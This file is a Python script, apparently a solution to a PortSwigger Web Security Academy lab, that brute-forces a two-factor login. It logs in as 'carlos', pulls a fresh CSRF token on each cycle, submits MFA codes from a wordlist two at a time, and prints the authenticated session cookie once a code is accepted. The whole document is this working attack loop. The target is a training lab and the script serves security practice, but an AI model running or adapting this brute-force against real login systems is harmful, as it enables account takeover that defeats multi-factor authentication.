import requests
import re
import os
import time
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    handlers=[
        logging.FileHandler(os.path.join(os.path.dirname(__file__), "..", "docs", "run.log")),
        logging.StreamHandler()  # continue to print in terminal
    ]
)

log = logging.getLogger(__name__)

def extract_csrf(html_resp):
    match = re.search(r'name="csrf" value="([^"]+)"', html_resp)
    if match is None:
        raise Exception(f"CSRF not found! Response:\n{html_resp}")
    csrf_token = match.group(1)
    return csrf_token

def load_codes(file_path):
    with open(file_path, "r") as f:
            codes = [line.strip() for line in f]
    return codes

CODES_PATH = os.path.join(os.path.dirname(__file__), "..", "docs", "codes.txt")

def execute_login_cycle(s, base_url, updated_csrf_token, index, codes):
    """
    Execute a complete login cycle: login -> 2 2fa tries -> return (success: bool, new_csrf: str, new_index: int)
    """
    lab_link = base_url + "/login"
    ##start = time.perf_counter()
    response = s.post(lab_link, 
                            data={
                              "csrf": updated_csrf_token,
                              "username": "carlos",
                              "password": "montoya"
                              },
                            timeout=15)
    ##duration = time.perf_counter() - start
    ##print(f"[POST /login] {duration:.2f}s |")
    
    csrf_login2 = extract_csrf(response.text)
    auth_endpoint = lab_link + "2"

    code1 = codes[index % len(codes)]
    code2 = codes[(index + 1) % len(codes)]

    ##start = time.perf_counter()
    r1 = s.post(auth_endpoint,
                data={
                    "csrf": csrf_login2,
                    "mfa-code": code1
                },
                allow_redirects=False,
                timeout=15
    )
    ##duration = time.perf_counter() - start
    ##print(f"[POST /login2 r1] {duration:.2f}s |")
    log.info("Testing code {}...".format(code1))
    if r1.status_code == 302:
            log.info("Success! Code: {}".format(code1))
            final = s.get(base_url + "/my-account", timeout=15)
            confirmed = "log out" in final.text.lower()
            log.info(f"[/my-account] status: {final.status_code} | confirmed: {confirmed}")
            return True, s.cookies.get("session"), None, None
    log.info("Code failed!")
    ##start = time.perf_counter()
    r2 = s.post(auth_endpoint,
                data={
                    "csrf": csrf_login2,
                    "mfa-code": code2
                },
                allow_redirects=False,
                timeout=15
    )
    log.info("Testing code {}...".format(code2))
    ##duration = time.perf_counter() - start
    ##print(f"[POST /login2 r2] {duration:.2f}s |")
    if r2.status_code == 302:
        log.info("Success! Code: {}".format(code2))
        final = s.get(base_url + "/my-account", timeout=15)
        confirmed = "log out" in final.text.lower()
        log.info(f"[/my-account] status: {final.status_code} | confirmed: {confirmed}")
        return True, s.cookies.get("session"), None, None
    else:
        log.info("Code failed!")
        new_csrf = extract_csrf(r2.text)
        return False, None, new_csrf, (index + 2)%len(codes)

    

def main():
    base_url = "https://0a8d00ee045fd9f4805fdf0300a00011.web-security-academy.net"
    login_endpoint = "/login"
    codes = load_codes(CODES_PATH)
    s = requests.Session()

    response = s.get(base_url + login_endpoint, timeout=15)
    csrf_token = extract_csrf(response.text)
    cycle_num = 0
    index = 0

    while (True):
        try:
            start = time.perf_counter()
            sucesso, session_cookie, csrf_token, index = execute_login_cycle(s, base_url, csrf_token, index, codes)
            duration = time.perf_counter() - start
            cycle_num += 1

            log.info(f"[Cycle {cycle_num}] {duration:.2f}s | index atual: {index} | csrf: {csrf_token}")

            if sucesso:
                log.info("Authenticated session cookie: {}".format(session_cookie))
                break
        except requests.exceptions.RequestException as e:
            log.warning(f"[NETWORK] Transitory error, trying again: {e}")
            time.sleep(2)
            continue
        except Exception as e:
             log.info(f"[Fatal] Unexpected failure: {e}")
             raise

if __name__ == "__main__":
    main()